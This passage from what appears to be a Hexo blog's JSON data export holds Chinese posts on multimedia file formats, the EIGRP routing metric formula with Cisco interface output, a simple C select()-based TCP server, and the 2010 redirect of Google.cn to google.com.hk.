<p>BMP</p> <p>无压缩，不会丢失图像的任何细节，但是占用的存储空间大</p> <p>JPG（JPEG）</p> <p>一种常用的压缩格式，占用的存储空间小</p> <p>GIF</p> <p>颜色的失真度较大，有动态和静态两种</p> <p>WMF</p> <p>微软公司自定的矢量图格式，OFFICE剪辑 库中的图形就是以这种格式保存的</p> <p>　　　　　常用的图形软件有：ACDSee、PhotoShop等。</p><p>（二） 声音</p><p>　　　几种常见的声音存储格式及特点。</p><p> </p> <p>格式</p> <p>特点</p> <p>WAV</p> <p>无压缩，音质最好，但占用的存储空间大</p> <p>MIDI</p> <p>电脑音乐的统称，占用的存储空间很小</p> <p>MP3</p> <p>将WAV压缩后的一种音乐格式，占用空间小， 声音质量高</p> <p>WMA</p> <p>微 软公司的一种声音格式，占用空间比MP3小，且声音质量很高</p> <p>　　常用的播放声音的软件有：Windows Media  Player、Winamp、豪杰超级解霸等</p><p>（三）视频和动画</p><p>　　　　几种常见的视频和动画的存储格式及特点。</p><p> </p> <p>格式</p> <p>特点</p> <p>AVI</p> <p>由视频和音频两部分组成，无压缩，高质量，但占用存储空间大</p> <p>RM</p> <p>质量不高，占用空间小，一般用于低速网上实时传 输音频和视频信息的压缩格式</p> <p>DAT</p> <p>VCD影碟中的视频文件</p> <p>SWF</p> <p>Flash动画，占用的空间小</p> <p>　　常用的视频播放软件有：豪杰超级解霸、Realone Player、Windows  Media Player、Flash Player等</p>","slug":"常见多媒体素材的格式和特点","published":1,"updated":"2023-04-22T05:38:45.051Z","_id":"clgrjlxl0009w7opi6jsc1c9o","comments":1,"layout":"post","photos":[],"link":"","content":"<p>常见多媒体素材的格式和特点</p><p>（一）图片</p><p>　　　　　几种常见的图片存储格式及特点。</p><p> </p> <p>格式</p> <p>特点</p> <p>BMP</p> <p>无压缩，不会丢失图像的任何细节，但是占用的存储空间大</p> <p>JPG（JPEG）</p> <p>一种常用的压缩格式，占用的存储空间小</p> <p>GIF</p> <p>颜色的失真度较大，有动态和静态两种</p> <p>WMF</p> <p>微软公司自定的矢量图格式，OFFICE剪辑 库中的图形就是以这种格式保存的</p> <p>　　　　　常用的图形软件有：ACDSee、PhotoShop等。</p><p>（二） 声音</p><p>　　　几种常见的声音存储格式及特点。</p><p> </p> <p>格式</p> <p>特点</p> <p>WAV</p> <p>无压缩，音质最好，但占用的存储空间大</p> <p>MIDI</p> <p>电脑音乐的统称，占用的存储空间很小</p> <p>MP3</p> <p>将WAV压缩后的一种音乐格式，占用空间小， 声音质量高</p> <p>WMA</p> <p>微 软公司的一种声音格式，占用空间比MP3小，且声音质量很高</p> <p>　　常用的播放声音的软件有：Windows Media  Player、Winamp、豪杰超级解霸等</p><p>（三）视频和动画</p><p>　　　　几种常见的视频和动画的存储格式及特点。</p><p> </p> <p>格式</p> <p>特点</p> <p>AVI</p> <p>由视频和音频两部分组成，无压缩，高质量，但占用存储空间大</p> <p>RM</p> <p>质量不高，占用空间小，一般用于低速网上实时传 输音频和视频信息的压缩格式</p> <p>DAT</p> <p>VCD影碟中的视频文件</p> <p>SWF</p> <p>Flash动画，占用的空间小</p> <p>　　常用的视频播放软件有：豪杰超级解霸、Realone Player、Windows  Media Player、Flash Player等</p>","site":{"data":{}},"excerpt":"","more":"<p>常见多媒体素材的格式和特点</p><p>（一）图片</p><p>　　　　　几种常见的图片存储格式及特点。</p><p> </p> <p>格式</p> <p>特点</p> <p>BMP</p> <p>无压缩，不会丢失图像的任何细节，但是占用的存储空间大</p> <p>JPG（JPEG）</p> <p>一种常用的压缩格式，占用的存储空间小</p> <p>GIF</p> <p>颜色的失真度较大，有动态和静态两种</p> <p>WMF</p> <p>微软公司自定的矢量图格式，OFFICE剪辑 库中的图形就是以这种格式保存的</p> <p>　　　　　常用的图形软件有：ACDSee、PhotoShop等。</p><p>（二） 声音</p><p>　　　几种常见的声音存储格式及特点。</p><p> </p> <p>格式</p> <p>特点</p> <p>WAV</p> <p>无压缩，音质最好，但占用的存储空间大</p> <p>MIDI</p> <p>电脑音乐的统称，占用的存储空间很小</p> <p>MP3</p> <p>将WAV压缩后的一种音乐格式，占用空间小， 声音质量高</p> <p>WMA</p> <p>微 软公司的一种声音格式，占用空间比MP3小，且声音质量很高</p> <p>　　常用的播放声音的软件有：Windows Media  Player、Winamp、豪杰超级解霸等</p><p>（三）视频和动画</p><p>　　　　几种常见的视频和动画的存储格式及特点。</p><p> </p> <p>格式</p> <p>特点</p> <p>AVI</p> <p>由视频和音频两部分组成，无压缩，高质量，但占用存储空间大</p> <p>RM</p> <p>质量不高，占用空间小，一般用于低速网上实时传 输音频和视频信息的压缩格式</p> <p>DAT</p> <p>VCD影碟中的视频文件</p> <p>SWF</p> <p>Flash动画，占用的空间小</p> <p>　　常用的视频播放软件有：豪杰超级解霸、Realone Player、Windows  Media Player、Flash Player等</p>"},{"title":"计算EIGRP的度量值方法","date":"2010-03-29T08:29:00.000Z","_content":"EIGRP 度量值的计算公式=[ K1 * Bandwidth + (K2 * Bandwidth)/(256-Load) +<br />K3*Delay ]*[K5/(Reliability + K4) ] *256<br />默认情况下，K1 = K3 = 1 ，K2 = K4 = K5 = 0 。<br />Bandwidth =10^7/所经由链路中入口带宽（单位为Kbps）的最小值<br />Delay=所经由链路中入口的延迟之和（单位为μs）/10<br />也就是说默认情况下，计算公式=[10^7/Bandwidth+Delay]*256<br /><br />例如：<br />路由条目如下。<br />“D 1.1.1.0 [90/20640000] via 192.168.12.1,00:04:19, Serial0/0<br /><br />带宽就是Serial0/0接口的带宽。<br />延迟就是Serial0/0和宣告1.1.1.0网段接口的延迟。<br /><br />带宽和延迟可以通过<br /><br />接口的带宽和延迟可以通过“show interface ”查看<br /><br />例：<br /><br />R1#sh inter f0/0<br />FastEthernet0/0 is administratively down, line protocol is down<br />Hardware is AmdFE, address is c800.06fc.0000 (bia c800.06fc.0000)<br />MTU 1500 bytes, BW 100000 Kbit, DLY 100 usec,<br />reliability 255/255, txload 1/255, rxload 1/255<br />Encapsulation ARPA, loopback not set<br />Keepalive set (10 sec)<br />Half-duplex, 100Mb/s, 100BaseTX/FX<br />ARP type: ARPA, ARP Timeout 04:00:00<br />Last input never, output never, output hang never<br />Last clearing of &quot;show interface&quot; counters never<br />Queueing strategy: fifo<br />Output queue 0/40, 0 drops; input queue 0/75, 0 drops<br />5 minute input rate 0 bits/sec, 0 packets/sec<br />5 minute output rate 0 bits/sec, 0 packets/sec<br />0 packets input, 0 bytes<br />Received 0 broadcasts, 0 runts, 0 giants, 0 throttles<br />0 input errors, 0 CRC, 0 frame, 0 overrun, 0 ignored<br />0 watchdog<br />0 input packets with dribble condition detected<br />0 packets output, 0 bytes, 0 underruns(0/0/0)<br />0 output errors, 0 collisions, 0 interface resets<br />0 babbles, 0 late collision, 0 deferred<br />0 lost carrier, 0 no carrier<br />0 output buffer failures, 0 output buffers swapped out<br />","source":"_posts/计算EIGRP的度量值方法.md","raw":"title: 计算EIGRP的度量值方法\ncategories: [网络工程]\ntags: []\ndate: 2010-03-29 16:29:00\n---\nEIGRP 度量值的计算公式=[ K1 * Bandwidth + (K2 * Bandwidth)/(256-Load) +<br />K3*Delay ]*[K5/(Reliability + K4) ] *256<br />默认情况下，K1 = K3 = 1 ，K2 = K4 = K5 = 0 。<br />Bandwidth =10^7/所经由链路中入口带宽（单位为Kbps）的最小值<br />Delay=所经由链路中入口的延迟之和（单位为μs）/10<br />也就是说默认情况下，计算公式=[10^7/Bandwidth+Delay]*256<br /><br />例如：<br />路由条目如下。<br />“D 1.1.1.0 [90/20640000] via 192.168.12.1,00:04:19, Serial0/0<br /><br />带宽就是Serial0/0接口的带宽。<br />延迟就是Serial0/0和宣告1.1.1.0网段接口的延迟。<br /><br />带宽和延迟可以通过<br /><br />接口的带宽和延迟可以通过“show interface ”查看<br /><br />例：<br /><br />R1#sh inter f0/0<br />FastEthernet0/0 is administratively down, line protocol is down<br />Hardware is AmdFE, address is c800.06fc.0000 (bia c800.06fc.0000)<br />MTU 1500 bytes, BW 100000 Kbit, DLY 100 usec,<br />reliability 255/255, txload 1/255, rxload 1/255<br />Encapsulation ARPA, loopback not set<br />Keepalive set (10 sec)<br />Half-duplex, 100Mb/s, 100BaseTX/FX<br />ARP type: ARPA, ARP Timeout 04:00:00<br />Last input never, output never, output hang never<br />Last clearing of &quot;show interface&quot; counters never<br />Queueing strategy: fifo<br />Output queue 0/40, 0 drops; input queue 0/75, 0 drops<br />5 minute input rate 0 bits/sec, 0 packets/sec<br />5 minute output rate 0 bits/sec, 0 packets/sec<br />0 packets input, 0 bytes<br />Received 0 broadcasts, 0 runts, 0 giants, 0 throttles<br />0 input errors, 0 CRC, 0 frame, 0 overrun, 0 ignored<br />0 watchdog<br />0 input packets with dribble condition detected<br />0 packets output, 0 bytes, 0 underruns(0/0/0)<br />0 output errors, 0 collisions, 0 interface resets<br />0 babbles, 0 late collision, 0 deferred<br />0 lost carrier, 0 no carrier<br />0 output buffer failures, 0 output buffers swapped out<br />","slug":"计算EIGRP的度量值方法","published":1,"updated":"2023-04-22T05:38:45.155Z","_id":"clgrjlxl1009y7opibtqna2rr","comments":1,"layout":"post","photos":[],"link":"","content":"<p>EIGRP 度量值的计算公式&#x3D;[ K1 * Bandwidth + (K2 * Bandwidth)&#x2F;(256-Load) +<br />K3<em>Delay ]</em>[K5&#x2F;(Reliability + K4) ] *256<br />默认情况下，K1 &#x3D; K3 &#x3D; 1 ，K2 &#x3D; K4 &#x3D; K5 &#x3D; 0 。<br />Bandwidth &#x3D;10^7&#x2F;所经由链路中入口带宽（单位为Kbps）的最小值<br />Delay&#x3D;所经由链路中入口的延迟之和（单位为μs）&#x2F;10<br />也就是说默认情况下，计算公式&#x3D;[10^7&#x2F;Bandwidth+Delay]*256<br /><br />例如：<br />路由条目如下。<br />“D 1.1.1.0 [90&#x2F;20640000] via 192.168.12.1,00:04:19, Serial0&#x2F;0<br /><br />带宽就是Serial0&#x2F;0接口的带宽。<br />延迟就是Serial0&#x2F;0和宣告1.1.1.0网段接口的延迟。<br /><br />带宽和延迟可以通过<br /><br />接口的带宽和延迟可以通过“show interface ”查看<br /><br />例：<br /><br />R1#sh inter f0&#x2F;0<br />FastEthernet0&#x2F;0 is administratively down, line protocol is down<br />Hardware is AmdFE, address is c800.06fc.0000 (bia c800.06fc.0000)<br />MTU 1500 bytes, BW 100000 Kbit, DLY 100 usec,<br />reliability 255&#x2F;255, txload 1&#x2F;255, rxload 1&#x2F;255<br />Encapsulation ARPA, loopback not set<br />Keepalive set (10 sec)<br />Half-duplex, 100Mb&#x2F;s, 100BaseTX&#x2F;FX<br />ARP type: ARPA, ARP Timeout 04:00:00<br />Last input never, output never, output hang never<br />Last clearing of &quot;show interface&quot; counters never<br />Queueing strategy: fifo<br />Output queue 0&#x2F;40, 0 drops; input queue 0&#x2F;75, 0 drops<br />5 minute input rate 0 bits&#x2F;sec, 0 packets&#x2F;sec<br />5 minute output rate 0 bits&#x2F;sec, 0 packets&#x2F;sec<br />0 packets input, 0 bytes<br />Received 0 broadcasts, 0 runts, 0 giants, 0 throttles<br />0 input errors, 0 CRC, 0 frame, 0 overrun, 0 ignored<br />0 watchdog<br />0 input packets with dribble condition detected<br />0 packets output, 0 bytes, 0 underruns(0&#x2F;0&#x2F;0)<br />0 output errors, 0 collisions, 0 interface resets<br />0 babbles, 0 late collision, 0 deferred<br />0 lost carrier, 0 no carrier<br />0 output buffer failures, 0 output buffers swapped out<br /></p>\n","site":{"data":{}},"excerpt":"","more":"<p>EIGRP 度量值的计算公式&#x3D;[ K1 * Bandwidth + (K2 * Bandwidth)&#x2F;(256-Load) +<br />K3<em>Delay ]</em>[K5&#x2F;(Reliability + K4) ] *256<br />默认情况下，K1 &#x3D; K3 &#x3D; 1 ，K2 &#x3D; K4 &#x3D; K5 &#x3D; 0 。<br />Bandwidth &#x3D;10^7&#x2F;所经由链路中入口带宽（单位为Kbps）的最小值<br />Delay&#x3D;所经由链路中入口的延迟之和（单位为μs）&#x2F;10<br />也就是说默认情况下，计算公式&#x3D;[10^7&#x2F;Bandwidth+Delay]*256<br /><br />例如：<br />路由条目如下。<br />“D 1.1.1.0 [90&#x2F;20640000] via 192.168.12.1,00:04:19, Serial0&#x2F;0<br /><br />带宽就是Serial0&#x2F;0接口的带宽。<br />延迟就是Serial0&#x2F;0和宣告1.1.1.0网段接口的延迟。<br /><br />带宽和延迟可以通过<br /><br />接口的带宽和延迟可以通过“show interface ”查看<br /><br />例：<br /><br />R1#sh inter f0&#x2F;0<br />FastEthernet0&#x2F;0 is administratively down, line protocol is down<br />Hardware is AmdFE, address is c800.06fc.0000 (bia c800.06fc.0000)<br />MTU 1500 bytes, BW 100000 Kbit, DLY 100 usec,<br />reliability 255&#x2F;255, txload 1&#x2F;255, rxload 1&#x2F;255<br />Encapsulation ARPA, loopback not set<br />Keepalive set (10 sec)<br />Half-duplex, 100Mb&#x2F;s, 100BaseTX&#x2F;FX<br />ARP type: ARPA, ARP Timeout 04:00:00<br />Last input never, output never, output hang never<br />Last clearing of &quot;show interface&quot; counters never<br />Queueing strategy: fifo<br />Output queue 0&#x2F;40, 0 drops; input queue 0&#x2F;75, 0 drops<br />5 minute input rate 0 bits&#x2F;sec, 0 packets&#x2F;sec<br />5 minute output rate 0 bits&#x2F;sec, 0 packets&#x2F;sec<br />0 packets input, 0 bytes<br />Received 0 broadcasts, 0 runts, 0 giants, 0 throttles<br />0 input errors, 0 CRC, 0 frame, 0 overrun, 0 ignored<br />0 watchdog<br />0 input packets with dribble condition detected<br />0 packets output, 0 bytes, 0 underruns(0&#x2F;0&#x2F;0)<br />0 output errors, 0 collisions, 0 interface resets<br />0 babbles, 0 late collision, 0 deferred<br />0 lost carrier, 0 no carrier<br />0 output buffer failures, 0 output buffers swapped out<br /></p>\n"},{"title":"高级I/O select 复用","date":"2013-04-24T14:31:25.000Z","_content":"<pre>\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n#include <sys/socket.h>\n#include <arpa/inet.h>\n#include <netdb.h>\n#include <errno.h>\n#define\tMAX_BACK 5\n#define BUFF_SIZE 1024\n#define TIMEOUT 30\nint sockfds[MAX_BACK];\nint main(int argc, char **argv)\n{\n\tstruct sockaddr_in sevaddr, cliaddr;\n\tsocklen_t socklen = sizeof(struct sockaddr_in);\n\tint sockfd, newfd, maxfd,  port, iBytes;\n\tchar\tbuff[BUFF_SIZE];\n\tint n = 1;\n\tif(argc != 2){\n\t\tprintf(\"Usage: %s <port> n\", argv[0]);\n\t\texit(1);\n\t}\n\tport = atoi(argv[1]);\n\tif((sockfd=socket(AF_INET, SOCK_STREAM, 0)) == -1) {\n\t\tperror(\"socket:\");\n\t\texit(1);\n\t}\n\tsevaddr.sin_family = AF_INET;\n\tsevaddr.sin_addr.s_addr = htonl(INADDR_ANY);\n\tsevaddr.sin_port = htons(port);\n\tsetsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &n, sizeof(int));\n\tif(bind(sockfd, (struct sockaddr *)&sevaddr, socklen) == -1) {\n\t\tperror(\"bind:\");\n\t\texit(1);\n\t}\n\tlisten(sockfd, MAX_BACK);\n\tprintf(\"Listen port:%dn\", port);\n\tint\tret;\n\tfd_set readfds;\n\tstruct timeval\tval;\n\tmaxfd = sockfd;\n\tint i;\n\tint comm_amount = 0 ;\n\twhile(1) {\n\t\tFD_ZERO(&readfds);\n\t\tFD_SET(sockfd, &readfds);\n\t\tmemset(&cliaddr, 0x00, socklen);\n\t\tval.tv_sec = 2;\n\t\tval.tv_usec = 0;\n\t\tfor (i=0; i < MAX_BACK; i++) {\n\t\t\tif(sockfds[i] != 0) {\n\t\t\t\tFD_SET(sockfds[i], &readfds);\n\t\t\t}\n\t\t}\n\t\tret = select(sockfd + 1, &readfds, 0, 0, &val);\n\t\tif(ret < 0) {\n\t\t\tperror(\"select:\");\n\t\t\tbreak;\n\t\t}else if (ret == 0 ) {\n\t\t\tprintf(\"timeoutn\");\n\t\t\tcontinue;\n\t\t}\n\t\tfor (i=0; i<comm_amount; i++) {\n\t\t\tif(FD_ISSET(sockfds[i], &readfds)) {\n\t\t\t\tret = recv(sockfds[i], buff, sizeof(buff), 0);\n\t\t\t\tif(ret < 0) {\n\t\t\t\t\tperror(\"recv:\");\n\t\t\t\t\tclose(sockfds[i]);\n\t\t\t\t\tcontinue;\n\t\t\t\t} else {\n\t\t\t\t\tprintf(\"recv buff:[%s]n\", buff);\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t\tif(FD_ISSET(sockfd, &readfds)) {\n\t\t\tnewfd = accept(sockfd, (struct sockaddr *)&cliaddr, &socklen);\n\t\t\tif(newfd <= 0) {\n\t\t\t\tperror(\"accept\");\n\t\t\t\tclose(newfd);\n\t\t\t\tbreak;\n\t\t\t}\n\t\t\tif(comm_amount < MAX_BACK) {\n\t\t\t\tsockfds[comm_amount++] = newfd;\n\t\t\t\tprintf(\"new connection client [%d] ip:[%s]:[%d]n\", comm_amount, inet_ntoa(cliaddr.sin_addr), ntohs(cliaddr.sin_port));\n\t\t\t\tif ( newfd > maxfd) maxfd = newfd;\n\t\t\t}else {\n\t\t\t\tprintf(\"max connection arrive, exitn\");\n\t\t\t\tsend(newfd,\"bye\", 4, 0);\n\t\t\t\tclose(newfd);\n\t\t\t\tcontinue;\n\t\t\t}\n\t\t}\n\t}\n}\n</pre>","source":"_posts/高级I-O-select-复用.md","raw":"title: 高级I/O select 复用\ncategories: [程序设计,C编程]\ntags: []\ndate: 2013-04-24 22:31:25\n---\n<pre>\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n#include <sys/socket.h>\n#include <arpa/inet.h>\n#include <netdb.h>\n#include <errno.h>\n#define\tMAX_BACK 5\n#define BUFF_SIZE 1024\n#define TIMEOUT 30\nint sockfds[MAX_BACK];\nint main(int argc, char **argv)\n{\n\tstruct sockaddr_in sevaddr, cliaddr;\n\tsocklen_t socklen = sizeof(struct sockaddr_in);\n\tint sockfd, newfd, maxfd,  port, iBytes;\n\tchar\tbuff[BUFF_SIZE];\n\tint n = 1;\n\tif(argc != 2){\n\t\tprintf(\"Usage: %s <port> n\", argv[0]);\n\t\texit(1);\n\t}\n\tport = atoi(argv[1]);\n\tif((sockfd=socket(AF_INET, SOCK_STREAM, 0)) == -1) {\n\t\tperror(\"socket:\");\n\t\texit(1);\n\t}\n\tsevaddr.sin_family = AF_INET;\n\tsevaddr.sin_addr.s_addr = htonl(INADDR_ANY);\n\tsevaddr.sin_port = htons(port);\n\tsetsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &n, sizeof(int));\n\tif(bind(sockfd, (struct sockaddr *)&sevaddr, socklen) == -1) {\n\t\tperror(\"bind:\");\n\t\texit(1);\n\t}\n\tlisten(sockfd, MAX_BACK);\n\tprintf(\"Listen port:%dn\", port);\n\tint\tret;\n\tfd_set readfds;\n\tstruct timeval\tval;\n\tmaxfd = sockfd;\n\tint i;\n\tint comm_amount = 0 ;\n\twhile(1) {\n\t\tFD_ZERO(&readfds);\n\t\tFD_SET(sockfd, &readfds);\n\t\tmemset(&cliaddr, 0x00, socklen);\n\t\tval.tv_sec = 2;\n\t\tval.tv_usec = 0;\n\t\tfor (i=0; i < MAX_BACK; i++) {\n\t\t\tif(sockfds[i] != 0) {\n\t\t\t\tFD_SET(sockfds[i], &readfds);\n\t\t\t}\n\t\t}\n\t\tret = select(sockfd + 1, &readfds, 0, 0, &val);\n\t\tif(ret < 0) {\n\t\t\tperror(\"select:\");\n\t\t\tbreak;\n\t\t}else if (ret == 0 ) {\n\t\t\tprintf(\"timeoutn\");\n\t\t\tcontinue;\n\t\t}\n\t\tfor (i=0; i<comm_amount; i++) {\n\t\t\tif(FD_ISSET(sockfds[i], &readfds)) {\n\t\t\t\tret = recv(sockfds[i], buff, sizeof(buff), 0);\n\t\t\t\tif(ret < 0) {\n\t\t\t\t\tperror(\"recv:\");\n\t\t\t\t\tclose(sockfds[i]);\n\t\t\t\t\tcontinue;\n\t\t\t\t} else {\n\t\t\t\t\tprintf(\"recv buff:[%s]n\", buff);\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t\tif(FD_ISSET(sockfd, &readfds)) {\n\t\t\tnewfd = accept(sockfd, (struct sockaddr *)&cliaddr, &socklen);\n\t\t\tif(newfd <= 0) {\n\t\t\t\tperror(\"accept\");\n\t\t\t\tclose(newfd);\n\t\t\t\tbreak;\n\t\t\t}\n\t\t\tif(comm_amount < MAX_BACK) {\n\t\t\t\tsockfds[comm_amount++] = newfd;\n\t\t\t\tprintf(\"new connection client [%d] ip:[%s]:[%d]n\", comm_amount, inet_ntoa(cliaddr.sin_addr), ntohs(cliaddr.sin_port));\n\t\t\t\tif ( newfd > maxfd) maxfd = newfd;\n\t\t\t}else {\n\t\t\t\tprintf(\"max connection arrive, exitn\");\n\t\t\t\tsend(newfd,\"bye\", 4, 0);\n\t\t\t\tclose(newfd);\n\t\t\t\tcontinue;\n\t\t\t}\n\t\t}\n\t}\n}\n</pre>","slug":"高级I-O-select-复用","published":1,"updated":"2023-04-22T05:38:45.167Z","_id":"clgrjlxl100a07opidlcaauwa","comments":1,"layout":"post","photos":[],"link":"","content":"<pre>\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n#include <sys/socket.h>\n#include <arpa/inet.h>\n#include <netdb.h>\n#include <errno.h>\n#define\tMAX_BACK 5\n#define BUFF_SIZE 1024\n#define TIMEOUT 30\nint sockfds[MAX_BACK];\nint main(int argc, char **argv)\n{\n    struct sockaddr_in sevaddr, cliaddr;\n    socklen_t socklen = sizeof(struct sockaddr_in);\n    int sockfd, newfd, maxfd,  port, iBytes;\n    char\tbuff[BUFF_SIZE];\n    int n = 1;\n    if(argc != 2){\n        printf(\"Usage: %s <port> n\", argv[0]);\n        exit(1);\n    }\n    port = atoi(argv[1]);\n    if((sockfd=socket(AF_INET, SOCK_STREAM, 0)) == -1) {\n        perror(\"socket:\");\n        exit(1);\n    }\n    sevaddr.sin_family = AF_INET;\n    sevaddr.sin_addr.s_addr = htonl(INADDR_ANY);\n    sevaddr.sin_port = htons(port);\n    setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &n, sizeof(int));\n    if(bind(sockfd, (struct sockaddr *)&sevaddr, socklen) == -1) {\n        perror(\"bind:\");\n        exit(1);\n    }\n    listen(sockfd, MAX_BACK);\n    printf(\"Listen port:%dn\", port);\n    int\tret;\n    fd_set readfds;\n    struct timeval\tval;\n    maxfd = sockfd;\n    int i;\n    int comm_amount = 0 ;\n    while(1) {\n        FD_ZERO(&readfds);\n        FD_SET(sockfd, &readfds);\n        memset(&cliaddr, 0x00, socklen);\n        val.tv_sec = 2;\n        val.tv_usec = 0;\n        for (i=0; i < MAX_BACK; i++) {\n            if(sockfds[i] != 0) {\n                FD_SET(sockfds[i], &readfds);\n            }\n        }\n        ret = select(sockfd + 1, &readfds, 0, 0, &val);\n        if(ret < 0) {\n            perror(\"select:\");\n            break;\n        }else if (ret == 0 ) {\n            printf(\"timeoutn\");\n            continue;\n        }\n        for (i=0; i<comm_amount; i++) {\n            if(FD_ISSET(sockfds[i], &readfds)) {\n                ret = recv(sockfds[i], buff, sizeof(buff), 0);\n                if(ret < 0) {\n                    perror(\"recv:\");\n                    close(sockfds[i]);\n                    continue;\n                } else {\n                    printf(\"recv buff:[%s]n\", buff);\n                }\n            }\n        }\n        if(FD_ISSET(sockfd, &readfds)) {\n            newfd = accept(sockfd, (struct sockaddr *)&cliaddr, &socklen);\n            if(newfd <= 0) {\n                perror(\"accept\");\n                close(newfd);\n                break;\n            }\n            if(comm_amount < MAX_BACK) {\n                sockfds[comm_amount++] = newfd;\n                printf(\"new connection client [%d] ip:[%s]:[%d]n\", comm_amount, inet_ntoa(cliaddr.sin_addr), ntohs(cliaddr.sin_port));\n                if ( newfd > maxfd) maxfd = newfd;\n            }else {\n                printf(\"max connection arrive, exitn\");\n                send(newfd,\"bye\", 4, 0);\n                close(newfd);\n                continue;\n            }\n        }\n    }\n}\n</pre>","site":{"data":{}},"excerpt":"","more":"<pre>\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n#include <sys/socket.h>\n#include <arpa/inet.h>\n#include <netdb.h>\n#include <errno.h>\n#define\tMAX_BACK 5\n#define BUFF_SIZE 1024\n#define TIMEOUT 30\nint sockfds[MAX_BACK];\nint main(int argc, char **argv)\n{\n    struct sockaddr_in sevaddr, cliaddr;\n    socklen_t socklen = sizeof(struct sockaddr_in);\n    int sockfd, newfd, maxfd,  port, iBytes;\n    char\tbuff[BUFF_SIZE];\n    int n = 1;\n    if(argc != 2){\n        printf(\"Usage: %s <port> n\", argv[0]);\n        exit(1);\n    }\n    port = atoi(argv[1]);\n    if((sockfd=socket(AF_INET, SOCK_STREAM, 0)) == -1) {\n        perror(\"socket:\");\n        exit(1);\n    }\n    sevaddr.sin_family = AF_INET;\n    sevaddr.sin_addr.s_addr = htonl(INADDR_ANY);\n    sevaddr.sin_port = htons(port);\n    setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &n, sizeof(int));\n    if(bind(sockfd, (struct sockaddr *)&sevaddr, socklen) == -1) {\n        perror(\"bind:\");\n        exit(1);\n    }\n    listen(sockfd, MAX_BACK);\n    printf(\"Listen port:%dn\", port);\n    int\tret;\n    fd_set readfds;\n    struct timeval\tval;\n    maxfd = sockfd;\n    int i;\n    int comm_amount = 0 ;\n    while(1) {\n        FD_ZERO(&readfds);\n        FD_SET(sockfd, &readfds);\n        memset(&cliaddr, 0x00, socklen);\n        val.tv_sec = 2;\n        val.tv_usec = 0;\n        for (i=0; i < MAX_BACK; i++) {\n            if(sockfds[i] != 0) {\n                FD_SET(sockfds[i], &readfds);\n            }\n        }\n        ret = select(sockfd + 1, &readfds, 0, 0, &val);\n        if(ret < 0) {\n            perror(\"select:\");\n            break;\n        }else if (ret == 0 ) {\n            printf(\"timeoutn\");\n            continue;\n        }\n        for (i=0; i<comm_amount; i++) {\n            if(FD_ISSET(sockfds[i], &readfds)) {\n                ret = recv(sockfds[i], buff, sizeof(buff), 0);\n                if(ret < 0) {\n                    perror(\"recv:\");\n                    close(sockfds[i]);\n                    continue;\n                } else {\n                    printf(\"recv buff:[%s]n\", buff);\n                }\n            }\n        }\n        if(FD_ISSET(sockfd, &readfds)) {\n            newfd = accept(sockfd, (struct sockaddr *)&cliaddr, &socklen);\n            if(newfd <= 0) {\n                perror(\"accept\");\n                close(newfd);\n                break;\n            }\n            if(comm_amount < MAX_BACK) {\n                sockfds[comm_amount++] = newfd;\n                printf(\"new connection client [%d] ip:[%s]:[%d]n\", comm_amount, inet_ntoa(cliaddr.sin_addr), ntohs(cliaddr.sin_port));\n                if ( newfd > maxfd) maxfd = newfd;\n            }else {\n                printf(\"max connection arrive, exitn\");\n                send(newfd,\"bye\", 4, 0);\n                close(newfd);\n                continue;\n            }\n        }\n    }\n}\n</pre>"},{"title":"谷歌关闭Google.cn 通过香港网站google.com.hk提供服务","date":"2010-03-23T03:06:00.000Z","_content":"谷歌关闭Google.cn 通过香港网站提供服务北京时间3月23日凌晨2点31分，google.cn自动跳转至google.com.hk，同时界面显示：“欢 迎来到谷歌搜索在中国的新家”。北京时  间3月23日凌晨3点07分，雅虎新闻频道援引美联社的报道称，谷歌将转移中国大陆的搜索引擎服务，但会继续保持在中国大陆的其它业务服务。<br /><br />google.cn自动跳转至google.com.hk <br /><br /><br />北京时间3月23日凌晨2点31分，google.cn自动跳转至google.com.hk，同时界面显示：“欢迎来到谷歌搜索在中国的新家”。<br /><br />另据网友反映，若此前用户设置的是谷歌的个性化界面，则在输入google.cn时，域名不会有跳转现象。<br /><br />UPDATE:谷歌声明：仍保留技术、销售办事处 <br /><br />北京时间3月23日凌晨3点07分，雅虎新闻频道援引美联社的报道称，谷歌将转移中国大陆  的搜索引擎服务，但仍会保留谷歌音乐、谷歌热榜、iGoogle等服务，以及在中国大陆的技术和销售办事处，以便为中国大陆的网民做技术支持服务以及继续  为中文版的搜索引擎做销售支持。但销售团队需要按照google.com.hk的有关事项行事。<br /><br />谷歌表示，该决定来自于谷歌美国总部，没有任何的谷歌中国员工参与该决定","source":"_posts/谷歌关闭Google.cn-通过香港网站google.com.hk提供服务.md","raw":"title: 谷歌关闭Google.cn 通过香港网站google.com.hk提供服务\ncategories: [网络工程]\ntags: []\ndate: 2010-03-23 11:06:00\n---\n谷歌关闭Google.cn 通过香港网站提供服务北京时间3月23日凌晨2点31分，google.cn自动跳转至google.com.hk，同时界面显示：“欢 迎来到谷歌搜索在中国的新家”。北京时  间3月23日凌晨3点07分，雅虎新闻频道援引美联社的报道称，谷歌将转移中国大陆的搜索引擎服务，但会继续保持在中国大陆的其它业务服务。<br /><br />google.cn自动跳转至google.com.hk <br /><br /><br />北京时间3月23日凌晨2点31分，google.cn自动跳转至google.com.hk，同时界面显示：“欢迎来到谷歌搜索在中国的新家”。<br /><br />另据网友反映，若此前用户设置的是谷歌的个性化界面，则在输入google.cn时，域名不会有跳转现象。<br /><br />UPDATE:谷歌声明：仍保留技术、销售办事处 <br /><br />北京时间3月23日凌晨3点07分，雅虎新闻频道援引美联社的报道称，谷歌将转移中国大陆  的搜索引擎服务，但仍会保留谷歌音乐、谷歌热榜、iGoogle等服务，以及在中国大陆的技术和销售办事处，以便为中国大陆的网民做技术支持服务以及继续  为中文版的搜索引擎做销售支持。但销售团队需要按照google.com.hk的有关事项行事。<br /><br 